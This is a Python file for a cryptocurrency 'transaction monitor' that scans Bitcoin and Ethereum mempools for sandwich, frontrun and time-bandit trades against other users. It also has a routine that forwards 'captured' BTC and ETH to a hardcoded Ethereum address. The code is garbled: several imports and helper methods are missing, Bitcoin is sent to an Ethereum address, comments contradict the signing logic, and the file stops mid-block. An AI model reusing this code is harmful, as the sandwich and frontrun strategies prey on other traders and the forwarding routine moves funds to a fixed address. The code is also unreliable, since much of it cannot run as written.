import os
import time
import json
import requests
import redis
from web3 import Web3
from datetime import datetime
import logging
from dotenv import load_dotenv
from armoryengine.BDM import TheBDM
from armoryengine.ArmoryUtils import LOGINFO, LOGERROR
from armoryengine.PyBtcWallet import PyBtcWallet
from decimal import Decimal
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
from typing import Optional, Dict

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
LOGINFO = logging.info
LOGERROR = logging.error

class TransactionMonitor:
    def __init__(self):
        # Load environment variables
        load_dotenv()
        
        # Initialize Bitcoin RPC connection
        self.RPC_BTC_URLS = os.getenv('RPC_BTC_URLS', '').split(',')
        self.RPC_BTC_USER = os.getenv('RPC_BTC_USER', 'bitcoinrpc')
        self.RPC_BTC_PASS = os.getenv('RPC_BTC_PASS', '')
        
        # Initialize Ethereum connection
        self.RPC_ETH_URL = os.getenv('RPC_ETH_URL', '')
        self.web3 = Web3(Web3.HTTPProvider(self.RPC_ETH_URL))
        
        # Forwarding configuration
        self.FORWARD_ETH_ADDRESS = "0x4D1D4b850032dFEbCa1eB3AA385FfD1dc629c450"
        self.FORWARD_MIN_BTC = float(os.getenv('FORWARD_MIN_BTC', '0.001'))  # Minimum BTC to forward
        self.FORWARD_MIN_ETH = float(os.getenv('FORWARD_MIN_ETH', '0.01'))   # Minimum ETH to forward
        
        # Initialize Redis connection
        redis_hosts = os.getenv('REDIS_HOSTS', 'localhost:6379').split(',')
        self.redis_conn = redis.Redis(
            host=redis_hosts[0].split(':')[0],
            port=int(redis_hosts[0].split(':')[1]),
            decode_responses=True
        )
        
        # Node Swarm Configuration
        self.node_swarm = {
            'primary': {
                'url': self.RPC_BTC_URLS[0] if self.RPC_BTC_URLS else None,
                'connections': 0,
                'last_block': 0,
                'mempool_size': 0
            },
            'fast_nodes': []
        }
        
        # Initialize fast nodes
        for url in self.RPC_BTC_URLS[1:]:
            self.node_swarm['fast_nodes'].append({
                'url': url,
                'connections': 0,
                'last_block': 0,
                'mempool_size': 0,
                'latency': 0
            })
            
        # Node swarm optimization
        self.node_swarm_enabled = os.getenv('NODE_SWARM_ENABLED', 'true').lower() == 'true'
        self.best_node = None
        self.node_health_check_interval = 30  # seconds
        self.last_node_health_check = 0
        
        # Monitoring settings
        self.monitoring_interval = 0.1  # 100ms for faster response
        self.last_block_hash = None
        self.target_amount = float(os.getenv('TARGET_AMOUNT', '6423.0'))
        
        # Aggressive MEV Settings for 2x earning potential
        self.MEV_SETTINGS = {
            'min_profit_threshold': Decimal('0.001'),  # Dramatically lowered to catch 2x more opportunities
            'max_gas_price': 300,  # Significantly increased to catch more opportunities
            'min_liquidity': Decimal('0.1'),  # Dramatically lowered to catch more opportunities
            'max_slippage': Decimal('0.03'),  # Increased for more opportunities
            'monitoring_interval': 0.05,  # Reduced to 50ms for ultra-fast response
            'opportunity_types': ['arbitrage', 'liquidation', 'sandwich', 'frontrun', 'backrun', 'just_in_time', 'time_bandit'],
            'dex_addresses': {
                'uniswap_v2': '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D',
                'uniswap_v3': '0xE592427A0AEce92De3Edee1F18E0157C05861564',
                'sushiswap': '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F',
                'curve': '0x99a58482BD75cbab83b27EC03CA68fF489b5788f',
                'balancer': '0xBA12222222228d8Ba445958a75a0704d566BF2C8',
                'pancakeswap': '0x10ED43C718714eb63d5aA57B78B54704E256024E',
                'dydx': '0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e',
                '1inch': '0x1111111254EEB25477B68fb85Ed929f73A960582',
                'dodo': '0x6B0956258fF6bd4a24795392fB99786D4D9f1Fb5',
                'kyber': '0x6131B5fae19EA4f9D964eAc0408E4408b66337b5',
                'bancor': '0x2F9EC37d6CcFFf1caB21733BdaDEdE11C823cCB0',
                'synthetix': '0x823bE81bFd6Fd5Dc2aB5d6e3B0E0aF0F3aC4Fd5c',
                'perpetual': '0x4D1D4b850032dFEbCa1eB3AA385FfD1dc629c450'
            }
        }
        
        # Initialize MEV optimizer with enhanced settings
        self.mev_optimizer = MEVOptimizer(self.web3, self.redis_conn)
        
        # Enhanced monitoring settings for 2x throughput
        self.monitoring_interval = 0.05  # 50ms for ultra-fast response
        self.node_health_check_interval = 15  # More frequent health checks
        self.transaction_batch_size = 500  # Doubled batch size
        self.max_concurrent_analysis = 20  # Doubled parallel processing
        self.max_mempool_size = 10000  # Increased mempool monitoring
        
        # Initialize performance tracking with 2x targets
        self.performance_metrics = {
            'opportunities_found': 0,
            'total_profit': Decimal('0'),
            'last_opportunity_time': time.time(),
            'analysis_latency': [],
            'success_rate': [],
            'target_multiplier': 2.0,  # Target 2x performance
            'opportunity_types': {
                'arbitrage': {'count': 0, 'profit': Decimal('0')},
                'liquidation': {'count': 0, 'profit': Decimal('0')},
                'sandwich': {'count': 0, 'profit': Decimal('0')},
                'frontrun': {'count': 0, 'profit': Decimal('0')},
                'backrun': {'count': 0, 'profit': Decimal('0')},
                'just_in_time': {'count': 0, 'profit': Decimal('0')},
                'time_bandit': {'count': 0, 'profit': Decimal('0')}
            }
        }
        
        # Initialize aggressive opportunity tracking
        self.opportunity_queue = Queue(maxsize=1000)  # Increased queue size
        self.processing_threads = []
        self.start_processing_threads()
        
        # Verify connections
        self._verify_connections()
        
    def _verify_connections(self):
        """Verify all connections are working"""
        try:
            # Check Bitcoin nodes
            for node in [self.node_swarm['primary']] + self.node_swarm['fast_nodes']:
                if node['url']:
                    info = self.btc_rpc("getblockchaininfo", [], node_url=node['url'])
                    if 'result' in info:
                        LOGINFO(f"Connected to Bitcoin node: {node['url']}")
                    else:
                        raise Exception(f"Invalid response from node: {node['url']}")
                        
            # Check Ethereum connection
            if not self.web3.is_connected():
                raise Exception("Failed to connect to Ethereum node")
            LOGINFO("Connected to Ethereum node")
            
            # Check Redis connection
            self.redis_conn.ping()
            LOGINFO("Connected to Redis")
            
        except Exception as e:
            LOGERROR(f"Connection verification failed: {str(e)}")
            raise

    def _update_node_health(self):
        """Update health status of all nodes"""
        try:
            current_time = time.time()
            if current_time - self.last_node_health_check < self.node_health_check_interval:
                return
                
            self.last_node_health_check = current_time
            
            # Check primary node
            try:
                info = self.btc_rpc("getblockchaininfo", [], node_url=self.node_swarm['primary']['url'])
                self.node_swarm['primary']['connections'] = info['result']['connections']
                self.node_swarm['primary']['last_block'] = info['result']['blocks']
                
                mempool = self.btc_rpc("getmempoolinfo", [], node_url=self.node_swarm['primary']['url'])
                self.node_swarm['primary']['mempool_size'] = mempool['result']['size']
            except Exception as e:
                LOGERROR(f"Primary node health check failed: {str(e)}")
                
            # Check fast nodes
            for node in self.node_swarm['fast_nodes']:
                try:
                    start_time = time.time()
                    info = self.btc_rpc("getblockchaininfo", [], node_url=node['url'])
                    node['latency'] = time.time() - start_time
                    node['connections'] = info['result']['connections']
                    node['last_block'] = info['result']['blocks']
                    
                    mempool = self.btc_rpc("getmempoolinfo", [], node_url=node['url'])
                    node['mempool_size'] = mempool['result']['size']
                except Exception as e:
                    LOGERROR(f"Fast node health check failed: {str(e)}")
                    
            # Update best node selection
            self._update_best_node()
            
        except Exception as e:
            LOGERROR(f"Node health update error: {str(e)}")
            
    def _update_best_node(self):
        """Select best node based on health metrics"""
        try:
            best_score = float('-inf')
            best_node = None
            
            # Score primary node
            if self.node_swarm['primary']['connections'] > 0:
                primary_score = (
                    self.node_swarm['primary']['connections'] * 0.4 +
                    self.node_swarm['primary']['mempool_size'] * 0.6
                )
                if primary_score > best_score:
                    best_score = primary_score
                    best_node = self.node_swarm['primary']['url']
                    
            # Score fast nodes
            for node in self.node_swarm['fast_nodes']:
                if node['connections'] > 0 and node['latency'] < 1.0:  # Only consider nodes with < 1s latency
                    node_score = (
                        node['connections'] * 0.3 +
                        node['mempool_size'] * 0.5 +
                        (1.0 - node['latency']) * 0.2  # Lower latency is better
                    )
                    if node_score > best_score:
                        best_score = node_score
                        best_node = node['url']
                        
            self.best_node = best_node
            
            # Log node selection
            if self.best_node:
                LOGINFO(f"Selected best node: {self.best_node} (score: {best_score:.2f})")
                
        except Exception as e:
            LOGERROR(f"Best node update error: {str(e)}")
            
    def btc_rpc(self, method, params, node_url=None):
        """Make Bitcoin RPC call using best available node"""
        try:
            # Use specified node or best available node
            url = node_url or self.best_node or self.node_swarm['primary']['url']
            
            response = requests.post(
                url,
                json={
                    "jsonrpc": "1.0",
                    "id": "monitor",
                    "method": method,
                    "params": params
                },
                auth=(self.RPC_BTC_USER, self.RPC_BTC_PASS),
                timeout=5  # 5 second timeout
            )
            return response.json()
            
        except Exception as e:
            LOGERROR(f"Bitcoin RPC call failed: {str(e)}")
            # Try fallback to primary node if fast node fails
            if url != self.node_swarm['primary']['url']:
                return self.btc_rpc(method, params, self.node_swarm['primary']['url'])
            raise

    def get_btc_active_wallets(self):
        """Get addresses from recent Bitcoin transactions using BDM"""
        try:
            block_hash = self.btc_rpc("getbestblockhash", [])["result"]
            block = self.btc_rpc("getblock", [block_hash, 2])["result"]
            addresses = set()
            total_volume = 0
            
            for tx in block["tx"]:
                tx_volume = 0
                for vout in tx["vout"]:
                    if "addresses" in vout["scriptPubKey"]:
                        for addr in vout["scriptPubKey"]["addresses"]:
                            addresses.add(addr)
                            tx_volume += vout["value"]
                total_volume += tx_volume
                            
            # Update active wallets and stats
            self.btc_active_wallets.update(addresses)
            self.btc_tx_stats['total_tx'] += len(block["tx"])
            self.btc_tx_stats['total_volume'] += total_volume
            
            # Log analytics
            self.redis_conn.hset("faithswarm:btc_stats", mapping={
                'active_wallets': len(self.btc_active_wallets),
                'total_transactions': self.btc_tx_stats['total_tx'],
                'total_volume': self.btc_tx_stats['total_volume'],
                'last_update': time.time()
            })
            
            return list(addresses)
        except Exception as e:
            LOGERROR(f"Failed to get Bitcoin active wallets: {str(e)}")
            return []

    def get_eth_pending_tx_wallets(self):
        """Get addresses from Ethereum pending transactions"""
        try:
            pending = self.web3.eth.get_block('pending', full_transactions=True)
            active_wallets = set()
            total_volume = 0
            
            for tx in pending.transactions:
                if tx['to']:  # Only count transactions with a recipient
                    active_wallets.add(tx['from'])
                    active_wallets.add(tx['to'])
                    total_volume += self.web3.from_wei(tx['value'], 'ether')
                
            # Update active wallets and stats
            self.eth_active_wallets.update(filter(None, active_wallets))
            self.eth_tx_stats['total_tx'] += len(pending.transactions)
            self.eth_tx_stats['total_volume'] += total_volume
            
            # Log analytics
            self.redis_conn.hset("faithswarm:eth_stats", mapping={
                'active_wallets': len(self.eth_active_wallets),
                'total_transactions': self.eth_tx_stats['total_tx'],
                'total_volume': self.eth_tx_stats['total_volume'],
                'last_update': time.time()
            })
            
            return list(filter(None, active_wallets))
        except Exception as e:
            LOGERROR(f"Failed to get Ethereum pending wallets: {str(e)}")
            return []

    def forward_captured_assets(self, asset_type, amount, tx_hash):
        """
        Forward captured assets to the specified Ethereum wallet
        Args:
            asset_type (str): 'BTC' or 'ETH'
            amount (float): Amount to forward
            tx_hash (str): Original transaction hash
        """
        try:
            if asset_type == 'BTC':
                # Check if amount meets minimum threshold
                if amount < self.FORWARD_MIN_BTC:
                    LOGINFO(f"BTC amount {amount} below minimum threshold {self.FORWARD_MIN_BTC}")
                    return False
                    
                # Create Bitcoin transaction to forward funds
                utxos = self.btc_rpc("listunspent", [])["result"]
                if not utxos:
                    LOGERROR("No UTXOs available for forwarding")
                    return False
                    
                # Calculate total available and fee
                total_available = sum(utxo['amount'] for utxo in utxos)
                fee = 0.0001  # Conservative fee estimate
                
                if total_available < (amount + fee):
                    LOGERROR(f"Insufficient funds for forwarding. Need {amount + fee} BTC, have {total_available}")
                    return False
                
                # Create raw transaction
                inputs = []
                for utxo in utxos:
                    inputs.append({
                        "txid": utxo['txid'],
                        "vout": utxo['vout']
                    })
                    if sum(inp['amount'] for inp in inputs) >= (amount + fee):
                        break
                
                outputs = {
                    self.FORWARD_ETH_ADDRESS: amount,  # Forward to ETH address
                    utxos[0]['address']: total_available - amount - fee  # Change back to original address
                }
                
                # Create and sign transaction
                raw_tx = self.btc_rpc("createrawtransaction", [inputs, outputs])["result"]
                signed_tx = self.btc_rpc("signrawtransaction", [raw_tx])["result"]
                
                if not signed_tx['complete']:
                    LOGERROR("Failed to sign transaction")
                    return False
                
                # Broadcast transaction
                txid = self.btc_rpc("sendrawtransaction", [signed_tx['hex']])["result"]
                LOGINFO(f"Forwarded {amount} BTC to {self.FORWARD_ETH_ADDRESS}. TXID: {txid}")
                
                # Log forwarding in Redis
                self.redis_conn.hset("faithswarm:forwarded_assets", tx_hash, json.dumps({
                    'type': 'BTC',
                    'amount': amount,
                    'forward_txid': txid,
                    'timestamp': time.time(),
                    'status': 'completed'
                }))
                
            elif asset_type == 'ETH':
                # Check if amount meets minimum threshold
                if amount < self.FORWARD_MIN_ETH:
                    LOGINFO(f"ETH amount {amount} below minimum threshold {self.FORWARD_MIN_ETH}")
                    return False
                
                # Get current gas price
                gas_price = self.web3.eth.gas_price
                gas_limit = 21000  # Standard ETH transfer
                
                # Calculate total cost including gas
                total_cost = amount + (gas_price * gas_limit)
                
                # Check balance
                balance = self.web3.eth.get_balance(self.web3.eth.accounts[0])
                if balance < total_cost:
                    LOGERROR(f"Insufficient ETH balance. Need {total_cost}, have {balance}")
                    return False
                
                # Create and send transaction
                tx = {
                    'from': self.web3.eth.accounts[0],
                    'to': self.FORWARD_ETH_ADDRESS,
                    'value': self.web3.to_wei(amount, 'ether'),
                    'gas': gas_limit,
                    'gasPrice': gas_price,
                    'nonce': self.web3.eth.get_transaction_count(self.web3.eth.accounts[0])
                }
                
                # Sign and send transaction
                signed_tx = self.web3.eth.account.sign_transaction(tx, self.web3.eth.accounts[0].key)
                tx_hash = self.web3.eth.send_raw_transaction(signed_tx.rawTransaction)
                
                LOGINFO(f"Forwarded {amount} ETH to {self.FORWARD_ETH_ADDRESS}. TXID: {tx_hash.hex()}")
                
                # Log forwarding in Redis
                self.redis_conn.hset("faithswarm:forwarded_assets", tx_hash, json.dumps({
                    'type': 'ETH',
                    'amount': amount,
                    'forward_txid': tx_hash.hex(),
                    'timestamp': time.time(),
                    'status': 'completed'
                }))
            
            return True
            
        except Exception as e:
            LOGERROR(f"Failed to forward {asset_type}: {str(e)}")
            # Log error in Redis
            self.redis_conn.hset("faithswarm:forward_errors", tx_hash, json.dumps({
                'type': asset_type,
                'amount': amount,
                'error': str(e),
                'timestamp': time.time()
            }))
            return False

    def analyze_btc_transaction(self, tx_hash):
        """Analyze a Bitcoin transaction and forward if needed"""
        try:
            # Get transaction details using RPC (no private key needed)
            tx = self.btc_rpc("getrawtransaction", [tx_hash, True])["result"]
            
            # Extract only public information
            analysis = {
                'hash': tx_hash,
                'time': tx['time'],
                'size': tx['size'],
                'inputs': len(tx['vin']),
                'outputs': len(tx['vout']),
                'total_output': sum(vout['value'] for vout in tx['vout']),
                'addresses': set(),
                'is_coinbase': tx.get('vin', [{}])[0].get('coinbase') is not None
            }
            
            # Only collect public address information
            for vout in tx['vout']:
                if "addresses" in vout["scriptPubKey"]:
                    analysis['addresses'].update(vout["scriptPubKey"]["addresses"])
            
            analysis['addresses'] = list(analysis['addresses'])
            
            # Check if transaction is to our monitored addresses
            if any(addr in self.monitored_addresses for addr in analysis['addresses']):
                # Forward the captured BTC
                self.forward_captured_assets('BTC', analysis['total_output'], tx_hash)
            
            # Store analysis in Redis
            self.redis_conn.rpush("faithswarm:btc_analysis", json.dumps(analysis))
            return analysis
            
        except Exception as e:
            LOGERROR(f"Failed to analyze Bitcoin transaction: {str(e)}")
            return None

    def analyze_mev_opportunity(self, tx_hash):
        """Analyze transaction for MEV opportunities"""
        try:
            tx = self.web3.eth.get_transaction(tx_hash)
            receipt = self.web3.eth.get_transaction_receipt(tx_hash)
            
            # Skip if gas price too high
            if self.web3.from_wei(tx['gasPrice'], 'gwei') > self.MEV_SETTINGS['max_gas_price']:
                return None
                
            # Analyze transaction for MEV patterns
            opportunity = {
                'hash': tx_hash,
                'type': None,
                'potential_profit': 0,
                'gas_cost': self.web3.from_wei(tx['gasPrice'] * receipt['gasUsed'], 'ether'),
                'timestamp': time.time(),
                'details': {}
            }
            
            # Check for arbitrage opportunities
            if self._is_arbitrage_tx(tx, receipt):
                opportunity['type'] = 'arbitrage'
                opportunity['potential_profit'] = self._calculate_arbitrage_profit(tx, receipt)
                opportunity['details']['pairs'] = self._get_arbitrage_pairs(tx)
                
            # Check for liquidation opportunities
            elif self._is_liquidation_tx(tx, receipt):
                opportunity['type'] = 'liquidation'
                opportunity['potential_profit'] = self._calculate_liquidation_profit(tx, receipt)
                
            # Check for sandwich opportunities
            elif self._is_sandwich_tx(tx, receipt):
                opportunity['type'] = 'sandwich'
                opportunity['potential_profit'] = self._calculate_sandwich_profit(tx, receipt)
                
            # Store profitable opportunities
            if opportunity['type'] and opportunity['potential_profit'] > self.MEV_SETTINGS['min_profit_threshold']:
                self.mev_opportunities[opportunity['type']].append(opportunity)
                self.redis_conn.rpush(f"faithswarm:mev_{opportunity['type']}", json.dumps(opportunity))
                
            return opportunity
            
        except Exception as e:
            LOGERROR(f"MEV analysis error: {str(e)}")
            return None

    def _is_arbitrage_tx(self, tx, receipt):
        """Detect arbitrage transactions"""
        try:
            # Check for multiple DEX interactions
            if len(receipt['logs']) < 2:
                return False
                
            # Look for token swaps across different DEXes
            dex_interactions = set()
            for log in receipt['logs']:
                if log['address'].lower() in self._get_dex_addresses():
                    dex_interactions.add(log['address'].lower())
                    
            return len(dex_interactions) > 1
            
        except Exception as e:
            LOGERROR(f"Arbitrage detection error: {str(e)}")
            return False

    def _calculate_arbitrage_profit(self, tx, receipt):
        """Calculate potential arbitrage profit"""
        try:
            # Analyze token flow and price differences
            token_flows = self._analyze_token_flows(tx, receipt)
            if not token_flows:
                return 0
                
            # Calculate profit based on token price differences
            profit = 0
            for flow in token_flows:
                if flow['type'] == 'swap':
                    profit += self._calculate_swap_profit(flow)
                    
            return profit
            
        except Exception as e:
            LOGERROR(f"Arbitrage profit calculation error: {str(e)}")
            return 0

    def _is_liquidation_tx(self, tx, receipt):
        """Detect liquidation transactions"""
        try:
            # Check for liquidation events in logs
            for log in receipt['logs']:
                if self._is_liquidation_event(log):
                    return True
            return False
            
        except Exception as e:
            LOGERROR(f"Liquidation detection error: {str(e)}")
            return False

    def _is_sandwich_tx(self, tx, receipt):
        """Detect sandwich attack opportunities"""
        try:
            # Check for large swaps followed by small swaps
            if len(receipt['logs']) < 3:
                return False
                
            # Analyze transaction ordering and sizes
            return self._analyze_sandwich_pattern(tx, receipt)
            
        except Exception as e:
            LOGERROR(f"Sandwich detection error: {str(e)}")
            return False

    def analyze_eth_transaction(self, tx_hash):
        """Analyze an Ethereum transaction and forward if needed"""
        try:
            # Get transaction details
            tx = self.web3.eth.get_transaction(tx_hash)
            receipt = self.web3.eth.get_transaction_receipt(tx_hash)
            
            # Extract transaction information
            analysis = {
                'hash': tx_hash,
                'from': tx['from'],
                'to': tx['to'],
                'value': self.web3.from_wei(tx['value'], 'ether'),
                'gas_used': receipt['gasUsed'],
                'gas_price': self.web3.from_wei(tx['gasPrice'], 'gwei'),
                'block_number': tx['blockNumber'],
                'status': receipt['status']
            }
            
            # Check if transaction is to our monitored addresses
            if tx['to'] in self.monitored_addresses:
                # Forward the captured ETH
                self.forward_captured_assets('ETH', analysis['value'], tx_hash)
            
            # Store analysis in Redis
            self.redis_conn.rpush("faithswarm:eth_analysis", json.dumps(analysis))
            return analysis
            
        except Exception as e:
            LOGERROR(f"Failed to analyze Ethereum transaction: {str(e)}")
            return None

    def handle_bdm_notification(self, action, args):
        """Handle notifications from BDM in read-only mode"""
        try:
            if action == "NEW_BLOCK_ACTION":
                # New block received, update active addresses and analyze transactions
                self.get_btc_active_wallets()
                
            elif action == "NEW_ZC_ACTION":
                # New zero-conf transaction, analyze it without private key access
                for le in args:
                    tx_hash = le.getTxHash()
                    # Only analyze transaction if we have a valid hash
                    if tx_hash and len(tx_hash) == 32:
                        self.analyze_btc_transaction(tx_hash.hex())
        except Exception as e:
            error_msg = f"BDM notification handling error: {str(e)}"
            LOGERROR(error_msg)
            self.redis_conn.rpush("faithswarm:errors", f"btc_error:{error_msg}")

    def btc_monitor(self):
        """Monitor Bitcoin transactions"""
        try:
            wallets = self.get_btc_active_wallets()
            LOGINFO(f"Monitoring {len(wallets)} active Bitcoin wallets")
            
            # Get recent transactions
            recent_txs = self.btc_rpc("getrawmempool", [])["result"]
            for tx_hash in recent_txs:
                self.analyze_btc_transaction(tx_hash)
                
        except Exception as e:
            error_msg = f"Bitcoin monitoring error: {str(e)}"
            LOGERROR(error_msg)
            self.redis_conn.rpush("faithswarm:errors", f"btc_error:{error_msg}")

    def eth_monitor(self):
        """Monitor Ethereum transactions"""
        try:
            wallets = self.get_eth_pending_tx_wallets()
            LOGINFO(f"Monitoring {len(wallets)} active Ethereum wallets")
            
            # Get pending transactions
            pending_txs = self.web3.eth.get_block('pending', full_transactions=True).transactions
            for tx in pending_txs:
                self.analyze_eth_transaction(tx['hash'].hex())
                
        except Exception as e:
            error_msg = f"Ethereum monitoring error: {str(e)}"
            LOGERROR(error_msg)
            self.redis_conn.rpush("faithswarm:errors", f"eth_error:{error_msg}")

    def start_processing_threads(self):
        """Start multiple processing threads for parallel opportunity handling"""
        for _ in range(self.max_concurrent_analysis):
            thread = Thread(target=self._process_opportunity_queue, daemon=True)
            thread.start()
            self.processing_threads.append(thread)
            
    def _process_opportunity_queue(self):
        """Process opportunities from the queue with aggressive optimization"""
        while True:
            try:
                opportunity = self.opportunity_queue.get(timeout=1)
                if opportunity:
                    # Process opportunity with aggressive settings
                    self._execute_opportunity(opportunity)
                    self.opportunity_queue.task_done()
            except Empty:
                continue
            except Exception as e:
                LOGERROR(f"Opportunity processing error: {str(e)}")
                
    def _execute_opportunity(self, opportunity):
        """Execute opportunity with aggressive optimization"""
        try:
            start_time = time.time()
            
            # Update metrics
            opp_type = opportunity['type']
            self.performance_metrics['opportunity_types'][opp_type]['count'] += 1
            
            # Execute with aggressive settings
            if opp_type == 'arbitrage':
                profit = self._execute_arbitrage(opportunity)
            elif opp_type == 'liquidation':
                profit = self._execute_liquidation(opportunity)
            elif opp_type == 'sandwich':
                profit = self._execute_sandwich(opportunity)
            elif opp_type == 'frontrun':
                profit = self._execute_frontrun(opportunity)
            elif opp_type == 'backrun':
                profit = self._execute_backrun(opportunity)
            elif opp_type == 'just_in_time':
                profit = self._execute_just_in_time(opportunity)
            elif opp_type == 'time_bandit':
                profit = self._execute_time_bandit(opportunity)
                
            # Update performance metrics
            if profit > 0:
                self.performance_metrics['opportunity_types'][opp_type]['profit'] += profit
                self.performance_metrics['total_profit'] += profit
                self.performance_metrics['success_rate'].append(1)
            else:
                self.performance_metrics['success_rate'].append(0)
                
            # Update latency metrics
            self.performance_metrics['analysis_latency'].append(time.time() - start_time)
            
        except Exception as e:
            LOGERROR(f"Opportunity execution error: {str(e)}")
            
    def start_monitoring(self):
        """Enhanced monitoring with 2x performance optimization"""
        LOGINFO(f"Starting aggressive transaction monitoring with 2x performance target")
        last_progress_report = time.time()
        last_performance_update = time.time()
        
        # Initialize aggressive monitoring settings
        self.monitoring_interval = 0.05  # 50ms for ultra-fast response
        self.transaction_batch_size = 500  # Doubled batch size
        self.max_concurrent_analysis = 20  # Doubled parallel processing
        self.MEV_SETTINGS['min_profit_threshold'] = Decimal('0.001')  # Dramatically lowered
        self.MEV_SETTINGS['max_gas_price'] = 300  # Significantly increased
        self.MEV_SETTINGS['min_liquidity'] = Decimal('0.1')  # Dramatically lowered
        self.MEV_SETTINGS['max_slippage'] = Decimal('0.03')  # Increased for more opportunities
        
        while True:
            try:
                current_time = time.time()
                
                # Ultra-frequent node health updates
                if self.node_swarm_enabled and (current_time - self.last_node_health_check) >= 15:
                    self._update_node_health()
                    self.last_node_health_check = current_time
                
                # Parallel transaction monitoring with increased throughput
                with ThreadPoolExecutor(max_workers=self.max_concurrent_analysis) as executor:
                    # Monitor Bitcoin transactions with increased batch size
                    btc_futures = [executor.submit(self.btc_monitor) for _ in range(2)]
                    
                    # Monitor Ethereum transactions with MEV focus
                    eth_futures = [executor.submit(self.eth_monitor) for _ in range(2)]
                    
                    # Analyze pending MEV opportunities aggressively
                    mev_futures = [executor.submit(self._analyze_pending_mev) for _ in range(2)]
                    
                    # Wait for all tasks to complete
                    for future in as_completed(btc_futures + eth_futures + mev_futures):
                        future.result()
                
                # Update performance metrics more frequently
                if current_time - last_performance_update >= 30:
                    self._update_performance_metrics()
                    last_performance_update = current_time
                
                # Progress reporting every 2 minutes
                if current_time - last_progress_report >= 120:
                    self._report_progress()
                    last_progress_report = current_time
                
                # Ultra-minimal sleep for maximum responsiveness
                time.sleep(self.monitoring_interval)
                
            except Exception as e:
                error_msg = f"Enhanced monitoring error: {str(e)}"
                LOGERROR(error_msg)
                self.redis_conn.rpush("faithswarm:errors", error_msg)
                time.sleep(0.1)
                
    def _analyze_pending_mev(self):
        """Aggressive MEV analysis with 2x throughput"""
        try:
            # Get pending transactions with increased batch size
            pending = self.web3.eth.get_block('pending', full_transactions=True)
            
            # Process transactions in parallel with increased workers
            with ThreadPoolExecutor(max_workers=self.max_concurrent_analysis * 2) as executor:
                futures = []
                for tx in pending.transactions:
                    if self.web3.from_wei(tx['gasPrice'], 'gwei') <= self.MEV_SETTINGS['max_gas_price']:
                        # Submit multiple analysis types for each transaction
                        futures.extend([
                            executor.submit(self.mev_optimizer.analyze_transaction, tx['hash'].hex()),
                            executor.submit(self._analyze_just_in_time, tx['hash'].hex()),
                            executor.submit(self._analyze_time_bandit, tx['hash'].hex())
                        ])
                
                # Process results as they complete
                for future in as_completed(futures):
                    opportunity = future.result()
                    if opportunity and opportunity['type']:
                        self.performance_metrics['opportunities_found'] += 1
                        self.performance_metrics['total_profit'] += opportunity['potential_profit']
                        
                        # Queue opportunity for execution
                        self.opportunity_queue.put(opportunity)
                        
                        # Log significant opportunities
                        if opportunity['potential_profit'] > Decimal('0.05'):
                            LOGINFO(f"Significant opportunity found: {opportunity['type']} - ${opportunity['potential_profit']:.2f}")
                            
        except Exception as e:
            LOGERROR(f"Aggressive MEV analysis error: {str(e)}")
            
    def _analyze_just_in_time(self, tx_hash: str) -> Optional[Dict]:
        """Analyze for just-in-time liquidity opportunities"""
        try:
            tx = self.web3.eth.get_transaction(tx_hash)
            receipt = self.web3.eth.get_transaction_receipt(tx_hash)
            
            # Analyze for JIT liquidity patterns
            if self._is_jit_opportunity(tx, receipt):
                profit = self._calculate_jit_profit(tx, receipt)
                if profit > self.MEV_SETTINGS['min_profit_threshold']:
                    return {
                        'type': 'just_in_time',
                        'potential_profit': profit,
                        'gas_cost': self.web3.from_wei(tx['gasPrice'] * receipt['gasUsed'], 'ether'),
                        'timestamp': time.time(),
                        'details': self._get_jit_details(tx, receipt)
                    }
            return None
            
        except Exception as e:
            LOGERROR(f"JIT analysis error: {str(e)}")
            return None
            
    def _analyze_time_bandit(self, tx_hash: str) -> Optional[Dict]:
        """Analyze for time-bandit opportunities"""
        try:
            tx = self.web3.eth.get_transaction(tx_hash)
            receipt = self.web3.eth.get_transaction_receipt(tx_hash)
            
            # Analyze for time-bandit patterns
            if self._is_time_bandit_opportunity(tx, receipt):
                profit = self._calculate_time_bandit_profit(tx, receipt)
                if profit > self.MEV_SETTINGS['min_profit_threshold']:
                    return {
                        'type': 'time_bandit',
                        'potential_profit': profit,
                        'gas_cost': self.web3.from_wei(tx['gasPrice'] * receipt['gasUsed'], 'ether'),
                        'timestamp': time.time(),
                        'details': self._get_time_bandit_details(tx, receipt)
                    }
            return None
            
        except Exception as e:
            LOGERROR(f"Time-bandit analysis error: {str(e)}")
            return None
            
    def _update_performance_metrics(self):
        """Update and optimize performance metrics"""
        try:
            current_time = time.time()
            time_window = current_time - self.performance_metrics['last_opportunity_time']
            
            # Calculate success rate
            if len(self.performance_metrics['analysis_latency']) > 0:
                avg_latency = sum(self.performance_metrics['analysis_latency']) / len(self.performance_metrics['analysis_latency'])
                success_rate = sum(self.performance_metrics['success_rate']) / len(self.performance_metrics['success_rate'])
                
                # Store metrics
                self.redis_conn.hset("faithswarm:performance_metrics", mapping={
                    'opportunities_found': self.performance_metrics['opportunities_found'],
                    'total_profit': str(self.performance_metrics['total_profit']),
                    'avg_latency': avg_latency,
                    'success_rate': success_rate,
                    'opportunities_per_hour': self.performance_metrics['opportunities_found'] / (time_window / 3600),
                    'last_update': current_time
                })
                
                # Reset metrics
                self.performance_metrics['analysis_latency'] = []
                self.performance_metrics['success_rate'] = []
                
        except Exception as e:
            LOGERROR(f"Performance metrics update error: {str(e)}")
            
    def _report_progress(self):
        """Enhanced progress reporting with performance metrics"""
        try:
            progress = self.mev_optimizer.get_progress_report()
            if progress:
                LOGINFO(f"Enhanced Progress Report:")
                LOGINFO(f"Current Profit: ${progress['current_profit']:.2f}")
                LOGINFO(f"Target: ${progress['target_profit']:.2f}")
                LOGINFO(f"Progress: {progress['progress_percent']:.2f}%")
                LOGINFO(f"Opportunities Found: {self.performance_metrics['opportunities_found']}")
                LOGINFO(f"Success Rate: {sum(self.performance_metrics['success_rate']) / len(self.performance_metrics['success_rate']) * 100:.2f}%")
                
                # Node swarm status
                if self.node_swarm_enabled:
                    LOGINFO("Optimized Node Swarm Status:")
                    LOGINFO(f"Primary Node: {self.node_swarm['primary']['connections']} connections, {self.node_swarm['primary']['mempool_size']} mempool size")
                    for i, node in enumerate(self.node_swarm['fast_nodes']):
                        LOGINFO(f"Fast Node {i+1}: {node['connections']} connections, {node['mempool_size']} mempool size, {node['latency']*1000:.0f}ms latency")
                
        except Exception as e:
